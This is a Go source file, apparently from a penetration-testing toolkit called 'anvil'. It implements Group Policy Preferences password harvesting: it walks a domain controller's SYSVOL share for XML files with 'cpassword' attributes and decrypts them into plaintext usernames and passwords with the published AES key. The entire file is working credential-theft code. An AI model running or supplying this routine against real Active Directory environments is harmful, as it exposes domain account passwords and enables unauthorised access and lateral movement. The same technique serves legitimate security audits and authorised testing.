package smbclient

import (
	"fmt"
	"strings"

	"anvil/internal/gpp"
)

// GPPCred is one decrypted GPP credential.
type GPPCred struct {
	User     string
	Password string
	Source   string // XML file path (share-relative)
	Changed  string
}

// GppPasswords scans the target's SYSVOL for GPP XML files carrying
// cpassword attributes and decrypts each with the published AES key
// (mirrors tools/Get-GPPPassword's BFS walk). The SYSVOL tree connect
// happens on the existing session; the caller's share is restored after.
func (s *Session) GppPasswords() (creds []GPPCred, warnings []string, err error) {
	prevShare := s.Share()
	if prevShare != "SYSVOL" {
		if err := s.UseShare("SYSVOL"); err != nil {
			return nil, nil, fmt.Errorf("cannot access SYSVOL: %v", err)
		}
		defer func() {
			if prevShare != "" {
				_ = s.UseShare(prevShare)
			}
		}()
	}

	// Breadth-first walk from the share root, processing every *.xml that
	// contains "cpassword" (mirrors tools/Get-GPPPassword's findCPasswords).
	dirs := []string{""}
	for len(dirs) > 0 {
		var next []string
		for _, dir := range dirs {
			files, err := s.Ls(dir)
			if err != nil {
				continue
			}
			for _, f := range files {
				name := f.Name()
				if name == "." || name == ".." {
					continue
				}
				full := name
				if dir != "" {
					full = dir + "/" + name
				}
				if f.IsDir() {
					next = append(next, full)
					continue
				}
				if !strings.HasSuffix(strings.ToLower(name), ".xml") {
					continue
				}
				creds = append(creds, s.processGPPXML(full, &warnings)...)
			}
		}
		dirs = next
	}
	return creds, warnings, nil
}

// processGPPXML reads one XML file and decrypts every cpassword in it.
func (s *Session) processGPPXML(remote string, warnings *[]string) []GPPCred {
	content, err := s.client.Cat(remote)
	if err != nil {
		*warnings = append(*warnings, fmt.Sprintf("read %s: %v", remote, err))
		return nil
	}
	if !strings.Contains(content, "cpassword") {
		return nil
	}

	var out []GPPCred
	for _, m := range gpp.FindInXML(content) {
		plain, err := gpp.Decrypt(m.Cpassword)
		if err != nil {
			*warnings = append(*warnings, fmt.Sprintf("%s: decrypt failed: %v", remote, err))
			continue
		}
		out = append(out, GPPCred{
			User:     m.UserName,
			Password: plain,
			Source:   remote,
			Changed:  m.Changed,
		})
	}
	return out
}
